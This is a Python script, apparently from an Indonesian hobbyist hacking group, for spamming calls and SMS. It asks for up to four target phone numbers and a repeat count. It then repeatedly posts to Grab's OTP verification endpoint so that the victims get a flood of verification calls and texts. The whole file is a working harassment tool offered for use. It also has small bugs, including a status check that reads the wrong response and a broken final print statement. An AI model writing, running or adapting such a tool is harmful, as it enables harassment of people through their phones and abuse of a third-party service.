#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by Mr.LD26
"""
ngapain bosq? mau cópas ya?
tinggal pake aja susah amat sih?!
"""

try:
	import os, requests, time
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

os.system('clear')
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("""%s
			SPAM CALL & SMS  v.3.0%s
       .----.          __  __      _     ____ ____   __
     .'  \__ '.       |  \/  |_ __| |   |  _ \___ \ / /_
    |   __|  _ :      | |\/| | '__| |   | | | |__) | '_ \ 
    V\/(0I0\/ |/      | |  | | | _| |___| |_| / __/| (_) |
       \ : /  '       |_|  |_|_|(_)_____|____/_____|\___/
       (oYo)	       %sAuthor  : MR.LD26%s
       /` `\__         %sContact : https://t.me/LD26NorthFals%s
     _|  _ Vuu: ,      %sGithub  : https://github.com/bagus26%s
    |uV\/ \| \_/|      %sTEAM    : GRETONGER BANYOL JABAR%s
    :      /\   :
    \   -'     / %sMASUKAN NOMOR DENGAN "62" (EX: 628XXXXXX)%s
      '-.___.-'  
<NOTE> WELCOME TO SPAMMER TOOLS"""%(c,r,g,r,g,r,g,r,g,r,w,r))
print("%s[*] Klik ENTER untuk melewati step%s"%(g,g))
no1 = input("[?] No TARGET CALL 1 => %s"%(w))
no2 = input("%s[?] No TARGET SMS  1 => %s"%(g,w))
no3 = input("%s[?] No TARGET CALL 2 => %s"%(g,w))
no4 = input("%s[?] No TARGET SMS  2 => %s"%(g,w))
jlmh=int(input("%s[?]   JUMLAH SPAM    => %s"%(g,w)))
dt1={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}
dt2={'method':'SMS','countryCode':'id','phoneNumber':no2,'templateID':'pax_android_production'}
dt3={'method':'CALL','countryCode':'id','phoneNumber':no3,'templateID':'pax_android_production'}
dt4={'method':'SMS','countryCode':'id','phoneNumber':no4,'templateID':'pax_android_production'}

try:
	print()
	print("%s[-] RESULT:%s"%(r,w))
	for i in range(jlmh):
		print("[!] PLEASE WAIT...")
		idk=("challengeID")
		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
		r2 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt2)
		r3 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt3)
		r4 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt4)
		if str(idk) in str(r1.text):
			print("[+] CALL 1 TERKIRIM")
		else:
			print("[-] CALL 1 NYANGKUT")
		if str(idk) in str(r2.text):
			print("[+] SMS  1 TERKIRIM")
		else:
			print("[-] SMS  1 NYANGKUT")
		if str(idk) in str(r3.text):
			print("[+] CALL 2 TERKIRIM")
		else:
			print("[-] CALL 2 NYANGKUT")
		if str(idk) in str(r3.text):
			print("[+] SMS  2 TERKIRIM")
		else:
			print("[-] SMS  2 NYANGKUT")
		print("÷"*30)
		time.sleep(1)
except KeyboardInterrupt:
	print("%s^•^SEE YOU NEXT TIME MAMANG^•^"%s(c))
